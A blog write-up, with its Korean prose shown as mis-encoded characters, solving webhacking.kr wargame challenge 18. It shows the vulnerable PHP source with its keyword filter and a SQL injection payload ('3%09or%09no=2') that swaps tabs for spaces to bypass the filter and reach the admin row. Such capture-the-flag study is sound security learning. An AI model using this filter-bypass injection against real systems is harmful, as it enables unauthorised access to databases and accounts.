---
title: "[webhacking.kr] 18ë²ˆ ë¬¸ì œ í’€ì´[sql injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "18ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
---

ğŸ’¡ Webhacking.kr challenge(old) 18ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
## ë¬¸ì œ í™”ë©´
   ![image](https://user-images.githubusercontent.com/33647663/150756775-46b3777f-066c-4b54-8730-6fa8103c0cc9.png)

## ì†ŒìŠ¤ ì½”ë“œ

  ```php
  <?php
  if($_GET['no']){
    $db = dbconnect();
    if(preg_match("/ |\/|\(|\)|\||&|select|from|0x/i",$_GET['no'])) exit("no hack");
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall18 where id='guest' and no=$_GET[no]")); // admin's no = 2

    if($result['id']=="guest") echo "hi guest";
    if($result['id']=="admin"){
      solve(18);
      echo "hi admin!";
    }
  }
  ?>
  ```

## ë¬¸ì œ ë¶„ì„
  php ì½”ë“œì— ë”°ë¼ no = 1ì„ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ```hi guest``` ê°€ ì¶œë ¥ë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150757046-fc9d3ca6-9f9c-4a72-ac6c-99bf02d8b1ed.png)

  ë‹¤ìŒ sqlë¬¸ì„ ìš°íšŒí•´ì„œ no=2ì¸ admin ì—´ì´ ë‚˜ì˜¬ ìˆ˜ ìˆë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤.

  ```sql
  select id from chall18 where id='guest' and no=$_GET[no]
  ```

  ìš°ì„  í•„í„°ë§ ëœ ë¬¸ìë“¤ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.
  | 1 | 2| 3| 4| 5 | 6 | 7 | 8 | 9 | 
  |:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
  |ê³µë°±[%20] | / | ( |  ) | \| | & | select | from | 0x|

   
   ê°€ì¥ ê¸°ë³¸ì ìœ¼ë¡œ ë– ì˜¤ë¥´ëŠ” ìš°íšŒ ë²•ì€ ```3 or no = 2```ì…ë‹ˆë‹¤. ì´ì¤‘ í•„í„°ë§ì— ê±¸ë¦¬ëŠ” ë¶€ë¶„ì€ **ê³µë°±** ë°–ì— ì—†ìœ¼ë¯€ë¡œ %20 -> %09ë¡œ ë°”ê¿”ì„œ ì…ë ¥ì„ í•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

   ```3%09or%09no=2```

   í´ë¦¬ì–´
   
   ![image](https://user-images.githubusercontent.com/33647663/150758265-fbc5dcd7-645e-42e2-a679-d80046e879a8.png)


  



 